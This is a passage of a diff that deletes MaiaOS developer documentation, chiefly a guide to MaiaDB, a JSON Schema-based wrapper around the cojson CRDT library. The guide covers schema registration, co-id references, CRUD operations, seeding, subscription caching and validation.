-   actor.context.todos.push(newTodo);
-   ```
-
-2. **Don't create custom subscription code** (SubscriptionEngine does it)
-
-3. **Don't mix reactive and non-reactive data** (use query objects for data arrays)
-
-4. **Don't put business logic in views** (state machines handle logic)
-
-5. **Don't create subscriptions in state machines** (context-driven only)
-
-6. **Don't bypass the @db tool** (always use it for data operations)
-
-## Summary
-
-### The Big Picture
-
-1. **Context = What I Need** (Declarative query objects)
-2. **SubscriptionEngine = The Watcher** (Automatic subscriptions)
-3. **MaiaDB = The Data Store** (Reactive database)
-4. **State Machines = Business Logic** (Pure transition rules)
-5. **Views = Presentation** (Pure UI rendering)
-
-### Key Concepts
-
-- **Context-driven reactivity**: Your context IS your subscription blueprint
-- **Automatic subscriptions**: SubscriptionEngine handles everything
-- **@ references**: Future-proof symbolic IDs (ready for CoJSON)
-- **Pure separation**: State machines (logic), Views (presentation), SubscriptionEngine (reactivity)
-- **Centralized**: All reactivity in one place (SubscriptionEngine), no scattered code
-
-### Remember
-
-You **never manually manage subscriptions**. Just declare what data you need in context, and MaiaOS does the rest! ✨
-
-## Next Steps
-
-- Learn about [Engines](./04_engines.md) - How the system executes your definitions
-- Understand [Tools](./08_tools.md) - Creating custom tools (like @db)
-- Explore [CoJSON Integration](./07_cojson.md) - Future collaborative sync
-- Read [Best Practices](../creators/10-best-practices.md) - Patterns and anti-patterns
-
----
-
-# 07_COJSON
-
-*Source: developers/07_cojson.md*
-
-# MaiaDB: JSON Schema-Native CRDT Database
-
-## Overview
-
-**MaiaDB** is a JSON Schema-native wrapper around cojson (Jazz's CRDT core library), providing a purely JSON-based database API with an operations-based architecture for collaborative data management in MaiaOS.
-
-**Key Features**:
-- **Operations-Based API**: Single `o.db({ op })` entry point for all database interactions
-- **Schema-as-CoMaps**: JSON Schemas are collaborative CRDTs themselves
-- **JSON-Native**: All operations are pure JSON configurations
-- **URI-Based References**: Standard `$ref` for schema dependencies
-- **100% Reactive**: Auto-subscribed data updates
-- **Auto-Resolution**: Nested co-id references resolve automatically via operations
-- **Real CRDTs**: Built on `cojson` package (Jazz's CRDT core)
-
-## Why MaiaDB?
-
-MaiaDB provides a high-level, JSON-native API over cojson's raw CRDT primitives:
-
-- **JSON Schema** for runtime validation and introspection
-- **Simple Operations API**: `o.db({ op: "create", ... })` instead of raw CRDT methods
-- **Auto-managed**: Subscriptions, caching, reference resolution handled internally
-- **Collaborative Schemas**: Schemas themselves are versioned CRDTs
-- **LLM-Friendly**: All operations have formal JSON Schema DSL definitions
-
-For details on the operations API, see [Operations Documentation](../vibes/11_operations.md).
-
-## Operations-Based Architecture
-
-MaiaDB uses a unified operations API where all database interactions flow through a single entry point:
-
-```javascript
-await o.db({ op: "operationName", ...params })
-```
-
-**Key benefits:**
-- **Uniform interface**: Single API for all CRUD + schema operations
-- **JSON-configurable**: All operations are pure JSON
-- **Validated**: Each operation type has a formal DSL schema
-- **Composable**: Operations can be batched and nested
-- **Read-only wrappers**: CoValue wrappers are read-only; all mutations via operations
-
-See the [Operations Guide](../creators/11_operations.md) for complete documentation.
-
-## Schema-as-CoMaps Architecture
-
-**MaiaCojson** has been renamed to **MaiaDB** with a revolutionary schema system where JSON Schemas themselves are collaborative CRDTs!
-
-### Core Concepts
-
-**1. Schema/Data Separation**
-
-MaiaDB maintains two distinct root-level CoMaps:
-
-- **`Schema` CoMap** (System/Meta Layer):
-  - `Genesis`: co-id reference to the MetaSchema CoValue
-  - `Registry`: CoList containing co-ids of all registered schemas
-  
-- **`Data` CoMap** (Application Layer):
-  - Your application's actual data
-  - References schemas by co-id for validation
-
-**2. MetaSchema (Self-Referencing)**
-
-The foundational meta-schema that validates all other schemas, including itself:
-
-```javascript
-{
-  "$schema": "https://maia.city/co_zMetaSchemaId",  // References itself!
-  "$id": "https://maia.city/co_zMetaSchemaId",      // Its own co-id
-  "type": "co-map",
-  "properties": {
-    "$schema": { "type": "co-id" },
-    "type": { "type": "string" },
-    "properties": { "type": "object" },
-    // ... JSON Schema 2020 spec
-  }
-}
-```
-
-**3. Schema Storage**
-
-Each registered schema is stored as a CoMap with a `definition` property:
-
-```javascript
-// Schema CoMap structure:
-{
-  definition: {
-    "$schema": "https://maia.city/co_zMetaSchemaId",
-    "$id": "https://maia.city/co_zSchemaId",
-    "type": "co-map",
-    "properties": {
-      "title": { "type": "string" },
-      "author": {
-        "type": "co-id",
-        "$ref": "https://maia.city/co_zAuthorSchemaId"
-      }
-    },
-    "required": ["title"]
-  }
-}
-```
-
-**Key Points:**
-- Schema definitions are **plain JSON objects** (not recursive CoMaps)
-- Each schema includes complete JSON Schema metadata (`$schema`, `$id`)
-- Schemas reference other schemas via `$ref` (for co-id properties)
-- All co-ids are formatted as URIs: `https://maia.city/{co-id}`
-
-**4. Registry System**
-
-The `Schema.Registry` is a CoList that tracks all registered schemas:
-
-```javascript
-Schema.Registry = [
-  "co_zMetaSchemaId",
-  "co_zAuthorSchemaId",
-  "co_zPostSchemaId",
-  // ... more schema co-ids
-]
-```
-
-### Co-ID References: Data Layer vs Schema Layer
-
-**CRITICAL DISTINCTION**: `type: "co-id"` and `$ref` serve different purposes and BOTH are required for entity-to-entity relationships:
-
-**`type: "co-id"` (Data Layer)**
-- Indicates a property contains a **reference** to another CoValue
-- The actual runtime value is a co-id string: `"co_zJohnDoe123"`
-- Used by MaiaDB to resolve and load the referenced CoValue
-
-**`$ref` (Schema Layer)**
-- Indicates **which schema** the referenced CoValue should conform to
-- Used at validation time to ensure data integrity
-- Points to another schema definition via URI
-
-**Example - Both Working Together:**
-
-```javascript
-// Schema Definition (tells MaiaDB what to expect)
-{
-  "type": "co-map",
-  "properties": {
-    "author": {
-      "type": "co-id",  // ← REQUIRED: Marks this as a reference
-      "$ref": "https://maia.city/co_zAuthorSchemaId"  // ← REQUIRED: Links to Author schema
-    }
-  }
-}
-
-// Data Instance (actual stored data)
-{
-  "title": "My Post",
-  "author": "co_zJohnDoe123"  // ← The actual co-id reference!
-}
-
-// Runtime Resolution:
-// 1. MaiaDB sees "type": "co-id" → loads co_zJohnDoe123
-// 2. MaiaDB sees "$ref" → validates loaded data against Author schema
-// 3. Returns wrapped CoMap representing the author
-```
-
-**Why Both Are Needed:**
-- `type: "co-id"` alone → MaiaDB knows it's a reference but can't validate it
-- `$ref` alone → Ajv validator doesn't know it's a CRDT reference
-- Together → Complete type safety + CRDT resolution
-
-### URI-Based References
-
-All schema references use the URI format `https://maia.city/{co-id}` for JSON Schema compatibility:
-
-**`$schema` (Validation)**
-- Reference to the meta-schema that validates this schema
-- For user schemas: `"$schema": "https://maia.city/co_zMetaSchemaId"`
-- For MetaSchema: `"$schema": "https://maia.city/co_zMetaSchemaId"` (self-reference)
-
-**`$id` (Identity)**
-- Unique identifier for the schema itself
-- Derived from the schema's CoMap co-id
-- Example: `"$id": "https://maia.city/co_zPostSchemaId"`
-
-**`$ref` (Cross-References)**
-- Native JSON Schema keyword for referencing other schemas
-- Used for co-id properties to link to their target schema
-- Example: `"$ref": "https://maia.city/co_zAuthorSchemaId"`
-
-**Why URIs?**
-- Standard JSON Schema format (Ajv compatible)
-- Globally unique (uses co-id)
-- Future-proof for distributed schema resolution
-- Clean separation between storage (co-id) and validation (URI)
-
-### Validation Strategy
-
-MaiaDB uses a two-layer approach to handle URI-based schemas:
-
-**1. Storage Layer (Full JSON Schema)**
-```javascript
-{
-  "$schema": "https://maia.city/co_zMetaId",
-  "$id": "https://maia.city/co_zPostId",
-  "properties": {
-    "author": {
-      "type": "co-id",
-      "$ref": "https://maia.city/co_zAuthorId"
-    }
-  }
-}
-```
-
-**2. Validation Layer (Metadata Stripped)**
-
-Before passing to Ajv, `_stripSchemaMetadata()` transforms the schema:
-
-```javascript
-// _stripSchemaMetadata() removes:
-// - Root-level $schema and $id (metadata)
-// - Replaces $ref with generic co-id pattern
-
-{
-  "properties": {
-    "author": {
-      "type": "string",
-      "pattern": "^co_z[a-zA-Z0-9]+$"  // Generic co-id validation
-    }
-  }
-}
-```
-
-**Benefits:**
-- JSON Schema compliance at storage layer
-- Ajv can validate data structure without resolving URIs
-- CRDT resolution happens at runtime (separate layer)
-- Clean separation of concerns
-
-## Architecture
-
-```mermaid
-graph TB
-    User[MaiaScript Code]
-    DB[MaiaDB API]
-    SchemaStore[Schema Store]
-    RefResolver[Reference Resolver]
-    SubCache[Subscription Cache]
-    Validators[JSON Schema Validators]
-    Wrappers[CoValue Wrappers]
-    RawCojson[Raw Cojson CRDTs]
-    
-    User -->|"db.create({schemaId})"| DB
-    User -->|"db.read({id})"| DB
-    User -->|"db.update({id})"| DB
-    User -->|"db.registerSchema()"| DB
-    
-    DB --> SchemaStore
-    DB --> Validators
-    DB --> RefResolver
-    DB --> SubCache
-    
-    SchemaStore -->|Load schema definitions| Wrappers
-    SchemaStore -->|MetaSchema validation| Validators
-    RefResolver --> Wrappers
-    SubCache --> Wrappers
-    Validators --> Wrappers
-    
-    Wrappers --> RawCojson
-    
-    RefResolver -.->|Auto-resolve co-ids| RefResolver
-    SubCache -.->|Deduplicate| SubCache
-    SchemaStore -.->|Schema/Data CoMaps| RawCojson
-```
-
-### Layers Explained
-
-1. **User Layer (MaiaScript)**
-   - Pure JSON operations
-   - No knowledge of CRDTs
-   - Simple, declarative API
-   - Works with schemaIds (co-ids)
-
-2. **MaiaDB API Layer**
-   - `MaiaDB` class (formerly MaiaCRUD)
-   - Handles create/read/update/delete
-   - Schema registration via `registerSchema()`
-   - Manages LocalNode, Account, Group internally
-
-3. **Schema Store Layer**
-   - Manages Schema-as-CoMaps architecture
-   - Bootstraps MetaSchema (self-referencing)
-   - Maintains Schema.Registry (CoList of schema co-ids)
-   - Loads and validates schema definitions
-   - Handles URI-based references (`$schema`, `$id`, `$ref`)
-
-4. **Core Systems**
-   - **Reference Resolver**: Auto-resolves co-id strings to CoValue wrappers
-   - **Subscription Cache**: Deduplicates subscriptions, 5-second cleanup timeout
-   - **JSON Schema Validators**: Validates data before CRDT operations (with metadata stripping)
-
-5. **Wrapper Layer**
-   - Thin Proxy-based wrappers around Raw CRDTs
-   - CoMap, CoList, CoStream, CoBinary, Account, Group, CoPlainText
-   - Property access via Proxies
-
-6. **Raw CRDT Layer** (from `cojson` package)
-   - RawCoMap, RawCoList, RawCoStream, etc.
-   - Actual collaborative data structures
-   - Sync, encryption, permissions built-in
-
-## CoValue Types
-
-MaiaDB provides 7 core CRDT types:
-
-| Type | JSON Schema | Description | Example |
-|------|-------------|-------------|---------|
-| **CoMap** | `co-map` | Key-value collaborative map | User profiles, settings |
-| **CoList** | `co-list` | Ordered collaborative list | Todo items, messages |
-| **CoStream** | `co-stream` | Append-only stream | Activity logs, events |
-| **CoBinary** | `co-binary` | Binary data stream | Files, images |
-| **Account** | `co-account` | User identity | Current user |
-| **Group** | `co-group` | Permission group | Teams, access control |
-| **CoPlainText** | `co-plaintext` | Collaborative text | Documents, notes |
-
-### Co-ID References
-
-References between CoValues use co-ids (string format: `co_z<base58>`) with explicit `$ref` for validation:
-
-```json
-{
-  "type": "co-map",
-  "properties": {
-    "author": {
-      "type": "co-id",
-      "$ref": "https://maia.city/co_zAuthorSchemaId"
-    }
-  }
-}
-```
-
-MaiaDB auto-resolves co-id strings to actual CoValue wrappers when accessed, and validates them against the referenced schema.
-
-## API Reference
-
-### Initialize MaiaDB
-
-```javascript
-import { MaiaDB } from '@maiaos/maia-cojson';
-import { LocalNode } from 'cojson';
-import { WasmCrypto } from 'cojson/crypto/WasmCrypto';
-
-// Initialize cojson runtime
-const crypto = await WasmCrypto.create();
-const { node, accountID } = await LocalNode.withNewlyCreatedAccount({
-  creationProps: { name: "Demo User" },
-  peers: [], // Add sync peers here
-  crypto,
-});
-const group = node.createGroup();
-
-// Create MaiaDB instance
-const db = new MaiaDB({ node, accountID, group });
-```
-
-### Account Initialization & Seeding
-
-**Seeding Service** - Initialize new accounts with example CoValues
-
-MaiaOS provides a centralized seeding service (`@MaiaOS/db`) that creates example CoValues for new accounts. This service demonstrates best practices for creating CoValues with proper group ownership.
-
-**Why Separate Seeding?**
-- **Separation of Concerns**: Account creation (authentication) is separate from data initialization (seeding)
-- **Reusable**: Can be used across multiple applications
-- **Clean Architecture**: One central UserGroup owns all example CoValues
-
-**Using the Seeding Service:**
-
-```javascript
-import { seedExampleCoValues } from "@MaiaOS/db";
-
-// After creating account
-const { node, account } = await signUpWithPasskey({ 
-  name: "maia",
-  salt: "maia.city" 
-});
-
-// Seed example CoValues
-await seedExampleCoValues(node, account, { name: "Maia User" });
-
-// Returns:
-// {
-//   userGroup,   // The owner group (co_z...)
-//   profile,     // Profile CoMap with ProfileSchema
-//   plainText,   // CoPlainText example
-//   stream,      // CoStream with ActivityStream schema
-//   notes        // Notes CoList with NotesSchema
-// }
-```
-
-**What Gets Created:**
-1. **UserGroup**: Central group that owns all example CoValues
-2. **Profile CoMap**: User profile with `ProfileSchema` in headerMeta
-3. **CoPlainText**: Example plain text storage
-4. **CoStream**: Activity stream example with `ActivityStream` schema
-5. **Notes CoList**: Example notes with `NotesSchema`
-
-**Architecture:**
-
-```mermaid
-sequenceDiagram
-    participant App as Application
-    participant Seed as seedExampleCoValues
-    participant Services as oGroup/oProfile/etc
-    
-    App->>Seed: seedExampleCoValues(node, account)
-    
-    Seed->>Services: createGroup(node)
-    Services-->>Seed: return userGroup
-    
-    Seed->>Services: createProfile(userGroup, {name})
-    Services-->>Seed: return profile
-    Seed->>Seed: account.set("profile", profile.id)
-    
-    Seed->>Services: createPlainText(userGroup, text)
-    Services-->>Seed: return plainText
-    
-    Seed->>Services: createCoStream(userGroup, schema)
-    Services-->>Seed: return stream
-    
-    Seed->>Services: createCoMap(userGroup, data, schema)
-    Services-->>Seed: return notes
-    
-    Seed-->>App: return all created CoValues
-```
-
-**Key Benefits:**
-- ✅ **No Group Ownership Issues**: UserGroup created FIRST, then all CoValues reference it
-- ✅ **Proper Metadata**: Each CoValue has appropriate schema in headerMeta
-- ✅ **Composable**: Uses existing primitives (oGroup, oProfile, oMap, oPlainText, oStream)
-- ✅ **Type-Safe**: All schemas are validated
-
-**Implementation Details:**
-
-The seeding service is located at `libs/maia-db/src/services/oSeeding.js` and uses the following primitives:
-
-```javascript
-// Internal implementation (for reference)
-import { createGroup } from "./oGroup.js";
-import { createProfile } from "./oProfile.js";
-import { createCoMap } from "./oMap.js";
-import { createPlainText } from "./oPlainText.js";
-import { createCoStream } from "./oStream.js";
-
-export async function seedExampleCoValues(node, account, { name = "Maia User" } = {}) {
-  // 1. Create UserGroup (owner of all example data)
-  const userGroup = createGroup(node, { name: "UserGroup" });
-  
-  // 2. Create Profile and link to account
-  const profile = createProfile(userGroup, { name });
-  account.set("profile", profile.id);
-  
-  // 3. Create example CoValues
-  const plainText = createPlainText(userGroup, "Hello from CoPlainText!", null);
-  const stream = createCoStream(userGroup, "ActivityStream");
-  const notes = createCoList(userGroup, [
-    {
-      title: "My First Note",
-      content: "This is an example note.",
-      created: new Date().toISOString()
-    }
-  ], "NotesSchema");
-  
-  return { userGroup, profile, plainText, stream, notes };
-}
-```
-
-**When to Use:**
-- ✅ After new account creation (signup flow)
-- ✅ When initializing demo/example data
-- ✅ When testing account initialization
-
-**When NOT to Use:**
-- ❌ During account login (data already exists)
-- ❌ For production user data (use proper schema registration instead)
-
-### db.registerSchema() - Register Schemas
-
-**Registers a new JSON Schema as a collaborative CoMap**
-
-```javascript
-const authorSchemaId = await db.registerSchema("Author", {
-  type: "co-map",
-  properties: {
-    title: { type: "string" },
-    description: { type: "string" }
-  },
-  required: ["title"]
-});
-
-const postSchemaId = await db.registerSchema("Post", {
-  type: "co-map",
-  properties: {
-    title: { type: "string" },
-    content: { type: "string" },
-    author: {
-      type: "co-id",  // ← Data layer
-      "$ref": `https://maia.city/${authorSchemaId}`  // ← Schema layer
-    },
-    likes: { type: "number" }
-  },
-  required: ["title", "content", "author"]
-});
-
-console.log(postSchemaId); // "co_z..." (the schema's co-id)
-```
-
-**Features**:
-- Stores schema as a CoMap with `definition` property
-- Automatically adds `$schema` and `$id` (URI format)
-- Validates schema against MetaSchema
-- Adds schema co-id to Schema.Registry
-- Returns schema co-id for use in `create()`
-
-**Important**: Schema names are NOT unique identifiers. Use the returned `schemaId` (co-id) for all operations.
-
-### db.create() - Create CoValues
-
-**Creates a new collaborative data structure**
-
-```javascript
-// First, register schema
-const postSchemaId = await db.registerSchema("Post", {
-  type: "co-map",
-  properties: {
-    title: { type: "string" },
-    content: { type: "string" },
-    author: { type: "co-id" },
-    likes: { type: "number" }
-  },
-  required: ["title", "content"]
-});
-
-// Then create data using schemaId
-const post = await db.create({
-  schemaId: postSchemaId,  // ← Use co-id returned from registerSchema
-  data: {
-    title: "Hello World",
-    content: "This is a collaborative post",
-    author: accountID, // Stores as co-id
-    likes: 0
-  }
-});
-
-console.log(post.$id); // Real CRDT ID: co_z...
-console.log(post.title); // "Hello World"
-```
-
-**Parameters**:
-- `schemaId`: co-id of registered schema (from `registerSchema()`)
-- `data`: Plain JSON object with data to store
-
-**Features**:
-- Infers CRDT type from schema definition (`type` property)
-- Validates data against JSON Schema before creating (with metadata stripping)
-- Automatically extracts co-ids from object references
-- Returns wrapped CoValue with property access
-
-**Supported CRDT Types** (inferred from schema):
-- `co-map` - Creates RawCoMap
-- `co-list` - Creates RawCoList
-- `co-stream` - Creates RawCoStream
-- `co-binary` - Creates RawBinaryCoStream
-
-### db.read() - Read CoValues (Reactive)
-
-**Loads a CoValue and auto-subscribes to updates**
-
-```javascript
-const post = await db.read({
-  id: "co_z123abc..."
-});
-
-console.log(post.title); // Current value
-
-// post.likes updates automatically when changed!
-// 100% reactive - no manual subscriptions needed
-```
-
-**Parameters**:
-- `id`: co-id of the CoValue to load
-- `timeout` (optional): Timeout in milliseconds
-
-**Features**:
-- Auto-detects CRDT type from the raw CoValue
-- Auto-subscribes via SubscriptionCache
-- Deduplicates subscriptions to same co-id
-- Returns loading state if unavailable: `{ $isLoaded: false, $id: "co_z..." }`
-- Updates automatically via real cojson subscriptions
-- No schema parameter needed (type detection is automatic)
-
-**Timeout Option**:
-```javascript
-const post = await db.read({
-  id: "co_z123...",
-  timeout: 10000, // 10 seconds
-});
-```
-
-### db.update() - Update CoValues
-
-**Modifies an existing CoValue**
-
-```javascript
-await db.update({
-  id: post.$id,
-  data: {
-    likes: 42,
-    title: "Updated Title"
-  }
-});
-
-// post.likes is now 42 (reactive update!)
-```
-
-**Parameters**:
-- `id`: co-id of the CoValue to update
-- `data`: Plain JSON object with properties to update
-
-**Features**:
-- Updates only specified properties
-- Works with CoMap (sets keys) and CoList (appends items)
-- Validation happens automatically if schema was registered
-- Direct property assignment on returned CoValue wrappers
-
-### db.delete() - Delete CoValues
-
-**Deletes a CoValue**
-
-```javascript
-await db.delete({
-  id: post.$id
-});
-
-// post.title is now undefined
-// All keys removed from CoMap
-```
-
-**Parameters**:
-- `id`: co-id of the CoValue to delete
-
-**Behavior**:
-- **CoMap**: Deletes all keys
-- **CoList**: Deletes all items
-- Underlying CRDT still exists (for sync), but content is cleared
-
-## JSON Schema Extensions
-
-MaiaDB extends JSON Schema with CRDT-specific types:
-
-### Co-Types
-
-```json
-{
-  "type": "co-map",
-  "properties": {
-    "title": { "type": "string" },
-    "items": { "type": "co-list" },
-    "author": { "type": "co-id" },
-    "data": { "type": "co-binary" }
-  }
-}
-```
-
-### Schema Preprocessing
-
-MaiaDB automatically converts `co-*` types to Ajv-compatible formats for validation:
-
-**Input**:
-```json
-{
-  "type": "co-map",
-  "properties": {
-    "author": { "type": "co-id" }
-  }
-}
-```
-
-**Preprocessed for Ajv**:
-```json
-{
-  "type": "object",
-  "x-co-type": "co-map",
-  "properties": {
-    "author": {
-      "type": "string",
-      "pattern": "^co_z[a-zA-Z0-9]+$",
-      "x-co-type": "co-id"
-    }
-  }
-}
-```
-
-The original type is preserved in `x-co-type` for internal use.
-
-## Complete Example: Blog System
-
-```javascript
-import { MaiaDB } from '@maiaos/maia-cojson';
-import { LocalNode } from 'cojson';
-import { WasmCrypto } from 'cojson/crypto/WasmCrypto';
-
-// Initialize
-const crypto = await WasmCrypto.create();
-const { node, accountID } = await LocalNode.withNewlyCreatedAccount({
-  creationProps: { name: "Blogger" },
-  peers: [],
-  crypto,
-});
-const group = node.createGroup();
-const db = new MaiaDB({ node, accountID, group });
-
-// 1. REGISTER SCHEMAS
-// Author schema (no dependencies)
-const authorSchemaId = await db.registerSchema("Author", {
-  type: "co-map",
-  properties: {
-    title: { type: "string" },
-    description: { type: "string" }
-  },
-  required: ["title"]
-});
-
-// Post schema (depends on Author)
-const postSchemaId = await db.registerSchema("Post", {
-  type: "co-map",
-  properties: {
-    title: { type: "string" },
-    content: { type: "string" },
-    author: {
-      type: "co-id",  // ← Data layer: marks as reference
-      "$ref": `https://maia.city/${authorSchemaId}`  // ← Schema layer: validation
-    },
-    likes: { type: "number" }
-  },
-  required: ["title", "content", "author"]
-});
-
-// Blog schema
-const blogSchemaId = await db.registerSchema("Blog", {
-  type: "co-map",
-  properties: {
-    title: { type: "string" },
-    posts: {
-      type: "co-list",
-      items: {
-        type: "co-id",  // ← References to posts
-        "$ref": `https://maia.city/${postSchemaId}`
-      }
-    }
-  },
-  required: ["title"]
-});
-
-console.log("Schemas registered:", { authorSchemaId, postSchemaId, blogSchemaId });
-
-// 2. CREATE author
-const author = await db.create({
-  schemaId: authorSchemaId,
-  data: {
-    title: "Tech Blogger",
-    description: "Writing about CRDTs"
-  }
-});
-
-// 3. CREATE blog
-const blog = await db.create({
-  schemaId: blogSchemaId,
-  data: {
-    title: "My Tech Blog"
-  }
-});
-
-console.log("Blog created:", blog.$id); // co_z...
-
-// 4. CREATE posts list
-const postsListSchemaId = await db.registerSchema("PostsList", {
-  type: "co-list",
-  items: {
-    type: "co-id",
-    "$ref": `https://maia.city/${postSchemaId}`
-  }
-});
-
-const posts = await db.create({
-  schemaId: postsListSchemaId,
-  data: []
-});
-
-// 5. CREATE post (with author reference)
-const post = await db.create({
-  schemaId: postSchemaId,
-  data: {
-    title: "Getting Started with MaiaDB",
-    content: "Welcome to MaiaDB! Schemas are CRDTs...",
-    author: author.$id,  // ← co-id reference stored
-    likes: 0
-  }
-});
-
-console.log("Post created:", post.$id);
-console.log("Author co-id:", post.author);  // "co_z..."
-
-// 6. ADD post to list
-await db.update({
-  id: posts.$id,
-  data: [post]  // Appends post reference
-});
-
-// 7. READ post (reactive!)
-const loadedPost = await db.read({
-  id: post.$id
-});
-
-console.log(loadedPost.title); // "Getting Started with MaiaDB"
-
-// 8. UPDATE post (increase likes)
-await db.update({
-  id: post.$id,
-  data: { likes: 42 }
-});
-
-// loadedPost.likes is now 42 (automatic reactive update!)
-console.log(loadedPost.likes); // 42
-
-// 9. DELETE post
-await db.delete({ id: post.$id });
-
-// loadedPost.title is now undefined (content cleared)
-```
-
-**Key Differences from Old API:**
-- ✅ Schemas registered first with `registerSchema()`
-- ✅ `create()` uses `schemaId` instead of inline schema
-- ✅ Explicit `$ref` for all co-id properties
-- ✅ `read()` doesn't need schema (auto-detected)
-- ✅ URI-based references (`https://maia.city/{co-id}`)
-- ✅ Clear separation: data layer (`type: "co-id"`) vs schema layer (`$ref`)
-
-## Reactivity System
-
-### How Reactivity Works
-
-**1. Subscription Cache (Deduplication)**
-
-When you call `db.read()`, MaiaDB:
-1. Checks if a subscription already exists for that co-id
-2. Reuses existing subscription (no duplicate `node.subscribe()` calls)
-3. Adds your read callback to the subscriber set
-4. When CRDT updates, triggers all callbacks
-
-**Structure**:
-```javascript
-Map<coId, {
-  callbacks: Set<Function>,
-  subscriberCount: number,
-  unsubscribe: Function,
-  cleanupTimeoutId: number | null,
-}>
-```
-
-**2. Cleanup Timeout (5 seconds)**
-
-When subscriber count reaches 0:
-1. Schedules cleanup after 5 seconds
-2. If new subscriber added, cancels cleanup
-3. Prevents subscription churn (rapid subscribe/unsubscribe)
-
-**3. Automatic Updates**
-
-When real CRDT changes:
-```
-RawCoMap.set() → node.subscribe() callback → All subscribers notified → UI updates
-```
-
-No manual subscription management needed!
-
-## Reference Resolution
-
-### The Problem
-
-CRDTs store references as co-id strings:
-
-```javascript
-{
-  "author": "co_z123abc..." // String, not object
-}
-```
-
-### MaiaDB Solution
-
-**Auto-Resolution**: When you access a co-id, MaiaDB automatically:
-1. Checks cache (coValuesCache)
-2. If not loaded, calls `node.load(coId)`
-3. Returns loading state immediately (non-blocking)
-4. Updates automatically when loaded
-
-**Example**:
-```javascript
-const post = await db.read({ id: "co_z123..." });
-
-// post.author is a co-id string internally
-// But you can resolve it:
-import { resolveReference } from '@maiaos/maia-cojson';
-
-const author = await resolveReference(
-  post.author,
-  null,  // Schema is auto-detected
-  db.node
-);
-
-console.log(author.name); // Resolved!
-```
-
-### Circular Reference Detection
-
-MaiaDB uses a `WeakSet` to track resolution paths:
-
-```javascript
-// map1.ref → map2
-// map2.ref → map1 (circular!)
-
-const map1 = await resolveReference(map1Id, schema, node);
-
-// Returns loading state for circular refs (no infinite loop)
-```
-
-## Caching System
-
-### Instance Cache (coValuesCache)
-
-**Purpose**: Ensure same `RawCoValue` always returns same wrapper instance (object identity)
-
-**Implementation**:
-```javascript
-// WeakMap<RawCoValue, CoValue>
-const coValuesCache = {
-  get(raw, compute) {
-    const cached = weakMap.get(raw);
-    if (cached) return cached;
-    
-    const computed = compute();
-    weakMap.set(raw, computed);
-    return computed;
-  },
-};
-```
-
-**Benefits**:
-- Automatic garbage collection (WeakMap)
-- Object identity: `CoMap.fromRaw(raw) === CoMap.fromRaw(raw)`
-- No memory leaks
-
-### Subscription Cache
-
-**Purpose**: Deduplicate subscriptions to same CoValue
-
-**Implementation**:
-```javascript
-Map<coId, {
-  callbacks: Set<Function>,
-  subscriberCount: number,
-  unsubscribe: Function,     // Real cojson unsubscribe
-  cleanupTimeoutId: number,   // 5-second timeout
-}>
-```
-
-**Lifecycle**:
-1. First `db.read()` → Creates subscription
-2. Second `db.read()` → Reuses subscription (adds callback)
-3. All callbacks unsubscribed → Schedules cleanup (5s)
-4. New `db.read()` before timeout → Cancels cleanup
-5. Timeout expires → Destroys subscription
-
-**Benefits**:
-- No duplicate `node.subscribe()` calls
-- Efficient update propagation
-- Prevents subscription churn
-- Automatic cleanup (no memory leaks)
-
-## Validation System
-
-### SchemaValidator
-
-**Purpose**: Validate data against JSON Schema before CRDT operations
-
-```javascript
-import { SchemaValidator } from '@maiaos/maia-cojson';
-
-const validator = new SchemaValidator({
-  type: "co-map",
-  properties: {
-    title: { type: "string" },
-    likes: { type: "number" },
-  },
-  required: ["title"],
-});
-
-try {
-  validator.validate({
-    title: "Hello",
-    likes: 42,
-  });
-  console.log("✅ Valid!");
-} catch (error) {
-  console.error("❌", error.message);
-  console.error("Errors:", error.ajvErrors);
-}
-```
-
-### Preprocessing
-
-**Schema Preprocessor** converts co-* types to Ajv-compatible formats:
-
-```javascript
-import { preprocessSchema } from '@maiaos/maia-cojson';
-
-const original = {
-  type: "co-map",
-  properties: {
-    author: { type: "co-id" }
-  }
-};
-
-const processed = preprocessSchema(original);
-
-// processed.type === "object"
-// processed["x-co-type"] === "co-map"
-// processed.properties.author.pattern === "^co_z[a-zA-Z0-9]+$"
-```
-
-### ValidationError
-
-Custom error class with formatted Ajv errors:
-
-```javascript
-try {
-  validator.validate(invalidData);
-} catch (error) {
-  console.log(error.message);
-  // "Validation failed:
-  //  (root): must have required property 'title'"
-  
-  console.log(error.ajvErrors);
-  // [{
-  //   instancePath: "",
-  //   schemaPath: "#/required",
-  //   keyword: "required",
-  //   params: { missingProperty: "title" },
-  //   message: "must have required property 'title'"
-  // }]
-  
-  console.log(error.originalSchema);
-  // Original JSON Schema
-}
-```
-
-## Internal Components
-
-### Wrappers (Proxy-based)
-
-All wrappers use JavaScript Proxies for property access:
-
-**CoMap Example**:
-```javascript
-class CoMap {
-  constructor(rawCoMap, schema) {
-    this._raw = rawCoMap;
-    this.$schema = schema;
-    
-    return new Proxy(this, {
-      get(target, prop) {
-        // System properties
-        if (prop === '$id') return target._raw.id;
-        if (prop === '$schema') return target.$schema;
-        
-        // Get from RawCoMap
-        const value = target._raw.get(prop);
-        
-        // Check if co-id reference
-        if (typeof value === 'string' && value.startsWith('co_')) {
-          return value; // Return co-id (resolve separately)
-        }
-        
-        return value;
-      },
-      
-      set(target, prop, value) {
-        // Extract $id if object
-        if (value && typeof value === 'object' && value.$id) {
-          target._raw.set(prop, value.$id);
-        } else {
-          target._raw.set(prop, value);
-        }
-        return true;
-      }
-    });
-  }
-  
-  static fromRaw(raw, schema) {
-    return coValuesCache.get(raw, () => new CoMap(raw, schema));
-  }
-}
-```
-
-### Reference Resolver
-
-**Purpose**: Auto-resolve co-id strings to CoValue wrappers
-
-**API**:
-```javascript
-import { resolveReference, isCoId } from '@maiaos/maia-cojson';
-
-// Check if value is a co-id
-if (isCoId(value)) {
-  // Resolve to wrapper
-  const resolved = await resolveReference(value, schema, node);
-  
-  if (resolved.$isLoaded) {
-    console.log(resolved.name); // Resolved CoMap
-  } else {
-    console.log("Loading..."); // Not yet available
-  }
-}
-```
-
-**Features**:
-- Uses `node.load()` for async loading
-- Returns loading state immediately (non-blocking)
-- Detects circular references
-- Integrates with coValuesCache
-
-### Subscription Cache
-
-**Purpose**: Deduplicate and manage cojson subscriptions
-
-**API**:
-```javascript
-import { SubscriptionCache } from '@maiaos/maia-cojson';
-
-const cache = new SubscriptionCache(5000); // 5-second cleanup
-
-// Add subscriber
-cache.addSubscriber(coId, (value) => {
-  console.log("Updated:", value);
-}, node);
-
-// Remove subscriber
-cache.removeSubscriber(coId, callback);
-
-// Get subscriber count
-cache.getSubscriberCount(coId); // number
-
-// Clear all
-cache.clear();
-```
-
